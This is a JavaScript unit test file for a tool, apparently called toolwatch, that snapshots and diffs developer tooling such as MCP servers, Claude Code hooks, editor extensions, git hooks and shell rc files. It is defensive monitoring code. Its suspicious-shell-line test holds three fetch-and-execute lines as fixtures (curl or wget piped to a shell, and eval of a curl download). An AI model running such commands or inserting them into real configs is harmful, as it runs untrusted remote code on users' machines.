/** Unit tests: pure functions (no network, no real home dir). Run with: node --test test/unit.test.js test/e2e.test.js */
import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  countSuspiciousShellLines,
  endpointHost,
  mcpServerEntries,
  parseClaudeHooks,
  parseClaudePlugins,
  parseExtensionsDir,
  parseGitHooks,
} from "../dist/collectors.js";
import { diffSnapshots, formatDiff, gateFailingChanges } from "../dist/diff.js";
import { fingerprintEntries, parseSnapshot, sortEntries } from "../dist/snapshot.js";

const entry = (kind, id, detail = "d", sha256 = "a".repeat(64)) => ({ kind, id, detail, sha256 });

describe("endpointHost", () => {
  it("strips path, query and userinfo", () => {
    assert.equal(endpointHost("https://user:pass@mcp.example.com:8443/v1?token=x"), "https://mcp.example.com:8443");
  });
  it("keeps ws/wss schemes", () => {
    assert.equal(endpointHost("wss://relay.example.com/socket"), "wss://relay.example.com");
  });
  it("rejects non-remote schemes and garbage", () => {
    assert.equal(endpointHost("file:///etc/passwd"), undefined);
    assert.equal(endpointHost("not a url"), undefined);
    assert.equal(endpointHost(""), undefined);
  });
});

describe("mcpServerEntries", () => {
  it("emits stdio servers without an endpoint entry", () => {
    const out = mcpServerEntries("claude-code", "claude-mcp-server", {
      fs: { command: "npx", args: ["-y", "@modelcontextprotocol/server-filesystem"] },
    });
    assert.equal(out.length, 1);
    assert.equal(out[0].id, "claude-code:mcp:fs");
    assert.match(out[0].detail, /stdio npx/);
  });
  it("emits a remote-endpoint entry for http servers", () => {
    const out = mcpServerEntries("claude-code", "claude-mcp-server", {
      remote: { type: "http", url: "https://mcp.postman.example/v1?key=secret" },
    });
    assert.equal(out.length, 2);
    const ep = out.find((e) => e.kind === "remote-endpoint");
    assert.equal(ep.id, "endpoint:https://mcp.postman.example");
    assert.match(ep.detail, /postman-remote|remote/);
    assert.doesNotMatch(ep.id, /secret/);
  });
  it("returns [] for undefined servers", () => {
    assert.deepEqual(mcpServerEntries("cursor", "cursor-mcp-server", undefined), []);
  });
});

describe("parseClaudeHooks", () => {
  it("parses SessionStart and PreToolUse hooks with matchers", () => {
    const out = parseClaudeHooks({
      hooks: {
        SessionStart: [{ matcher: "*", hooks: [{ type: "command", command: "bridge --start" }] }],
        PreToolUse: [{ matcher: "Bash", hooks: [{ type: "command", command: "lint.sh" }] }],
      },
    });
    assert.equal(out.length, 2);
    assert.equal(out[0].id, "claude-code:hook:PreToolUse:Bash");
    assert.equal(out[1].id, "claude-code:hook:SessionStart:*");
    assert.equal(out[1].detail, "command bridge --start");
  });
  it("returns [] when no hooks key", () => {
    assert.deepEqual(parseClaudeHooks({}), []);
  });
});

describe("parseClaudePlugins", () => {
  it("reads marketplace/plugin/version from plugin.json", () => {
    const dir = mkdtempSync(join(tmpdir(), "tw-plugins-"));
    mkdirSync(join(dir, "marketplace-a", "my-plugin", ".claude-plugin"), { recursive: true });
    writeFileSync(
      join(dir, "marketplace-a", "my-plugin", ".claude-plugin", "plugin.json"),
      JSON.stringify({ name: "my-plugin", version: "2.0.1" }),
    );
    const out = parseClaudePlugins(dir);
    assert.equal(out.length, 1);
    assert.equal(out[0].id, "claude-code:plugin:my-plugin");
    assert.match(out[0].detail, /marketplace-a/);
    assert.match(out[0].detail, /version 2\.0\.1/);
  });
});

describe("parseExtensionsDir", () => {
  it("parses publisher.name@version from package.json", () => {
    const dir = mkdtempSync(join(tmpdir(), "tw-ext-"));
    mkdirSync(join(dir, "esbenp.prettier-vscode-12.4.0"), { recursive: true });
    writeFileSync(
      join(dir, "esbenp.prettier-vscode-12.4.0", "package.json"),
      JSON.stringify({ publisher: "esbenp", name: "prettier-vscode", version: "12.4.0" }),
    );
    const out = parseExtensionsDir(dir, "vscode-extension");
    assert.equal(out.length, 1);
    assert.equal(out[0].id, "esbenp.prettier-vscode");
    assert.equal(out[0].detail, "version 12.4.0");
  });
  it("records unreadable extensions as @unknown instead of crashing", () => {
    const dir = mkdtempSync(join(tmpdir(), "tw-ext2-"));
    mkdirSync(join(dir, "weird-dir"), { recursive: true });
    const out = parseExtensionsDir(dir, "vscode-extension");
    assert.equal(out.length, 1);
    assert.equal(out[0].id, "weird-dir");
    assert.equal(out[0].detail, "no readable package.json");
  });
  it("returns [] for a missing directory", () => {
    assert.deepEqual(parseExtensionsDir("/nonexistent-dir-xyz", "vscode-extension"), []);
  });
});

describe("parseGitHooks", () => {
  it("records executable hooks, ignores *.sample, hashes content", () => {
    const repo = mkdtempSync(join(tmpdir(), "tw-repo-"));
    mkdirSync(join(repo, ".git", "hooks"), { recursive: true });
    writeFileSync(join(repo, ".git", "hooks", "pre-commit"), "#!/bin/sh\nnpm test\n");
    writeFileSync(join(repo, ".git", "hooks", "commit-msg.sample"), "# sample\n");
    const out = parseGitHooks(repo);
    assert.equal(out.length, 1);
    assert.equal(out[0].kind, "git-hook");
    assert.match(out[0].id, /pre-commit$/);
    assert.match(out[0].detail, /sha256:[0-9a-f]{12}/);
  });
  it("returns [] when there is no .git/hooks", () => {
    assert.deepEqual(parseGitHooks("/nonexistent-repo-xyz"), []);
  });
});

describe("countSuspiciousShellLines", () => {
  it("counts curl-pipe-to-shell and eval, ignores benign lines", () => {
    const content = [
      "export PATH=\"$HOME/bin:$PATH\"",
      "curl -fsSL https://example.com/install.sh | sh",
      "wget -qO- https://example.com/x | bash",
      "eval \"$(curl -s https://example.com/rc)\"",
      "alias ll='ls -la'",
    ].join("\n");
    assert.equal(countSuspiciousShellLines(content), 3);
  });
  it("returns 0 for a clean file", () => {
    assert.equal(countSuspiciousShellLines("export EDITOR=vim\n"), 0);
  });
});

describe("fingerprintEntries / sortEntries", () => {
  it("is order-independent", () => {
    const a = [entry("claude-hook", "h1"), entry("vscode-extension", "e1")];
    const b = [entry("vscode-extension", "e1"), entry("claude-hook", "h1")];
    assert.equal(fingerprintEntries(a), fingerprintEntries(b));
    assert.deepEqual(
      sortEntries(b).map((e) => e.id),
      ["h1", "e1"],
    );
  });
  it("changes when an entry hash changes", () => {
    const a = [entry("vscode-extension", "e1", "d", "a".repeat(64))];
    const b = [entry("vscode-extension", "e1", "d", "b".repeat(64))];
    assert.notEqual(fingerprintEntries(a), fingerprintEntries(b));
  });
});

describe("diffSnapshots", () => {
  const snap = (entries) => ({
    toolwatch: "0.1.0",
    createdAt: "2026-11-05T00:00:00.000Z",
    platform: "linux",
    hostname: "test",
    home: "/tmp/home",
    collectors: {},
    entries,
    fingerprint: "x",
  });
  it("detects added, removed and changed entries", () => {
    const before = snap([
      entry("vscode-extension", "a.b@1.0.0", "version 1.0.0", "a".repeat(64)),
      entry("claude-hook", "h-gone", "d", "c".repeat(64)),
    ]);
    const after = snap([
      entry("vscode-extension", "a.b@1.0.0", "version 1.0.0", "a".repeat(64)),
      entry("vscode-extension", "a.b@2.0.0", "version 2.0.0", "d".repeat(64)),
      entry("claude-hook", "h-new", "d", "e".repeat(64)),
    ]);
    const changes = diffSnapshots(before, after);
    // a.b@1.0.0 unchanged; a.b@2.0.0 is a different id -> added; h-new added; h-gone removed.
    assert.equal(changes.filter((c) => c.type === "added").length, 2);
    assert.equal(changes.filter((c) => c.type === "removed").length, 1);
    assert.equal(changes.filter((c) => c.type === "changed").length, 0);
  });
  it("treats a hash change on the same id as changed (version bump shape)", () => {
    const before = snap([entry("shell-rc", "shell-rc:.bashrc", "sha256:aaaa suspicious-lines:0", "a".repeat(64))]);
    const after = snap([entry("shell-rc", "shell-rc:.bashrc", "sha256:bbbb suspicious-lines:0", "b".repeat(64))]);
    const changes = diffSnapshots(before, after);
    assert.equal(changes.length, 1);
    assert.equal(changes[0].type, "changed");
  });
  it("returns [] for identical snapshots", () => {
    const s = snap([entry("claude-hook", "h1")]);
    assert.deepEqual(diffSnapshots(s, s), []);
  });
});

describe("gateFailingChanges", () => {
  it("gates on added/changed, not on removals by default", () => {
    const changes = [
      { type: "added", kind: "claude-hook", id: "h" },
      { type: "removed", kind: "vscode-extension", id: "e" },
    ];
    assert.equal(gateFailingChanges(changes, false).length, 1);
    assert.equal(gateFailingChanges(changes, true).length, 2);
  });
});

describe("formatDiff", () => {
  it("renders a readable table and a summary line", () => {
    const out = formatDiff([
      { type: "added", kind: "postman-plugin", id: "postman:plugin:claude-code@1.0.0", after: entry("postman-plugin", "x", "dir .config/Postman/plugins") },
    ]);
    assert.match(out, /ADDED/);
    assert.match(out, /postman:plugin:claude-code/);
    assert.match(out, /1 change\(s\): 1 added, 0 changed, 0 removed/);
  });
  it("says so when nothing changed", () => {
    assert.match(formatDiff([]), /identical/);
  });
});

describe("parseSnapshot", () => {
  it("rejects non-objects and entries missing fields", () => {
    assert.throws(() => parseSnapshot(null), /not an object/);
    assert.throws(() => parseSnapshot({ toolwatch: "0.1.0" }), /no entries array/);
    assert.throws(
      () => parseSnapshot({ toolwatch: "0.1.0", entries: [{ id: "x" }] }),
      /missing id\/kind\/detail\/sha256/,
    );
  });
});
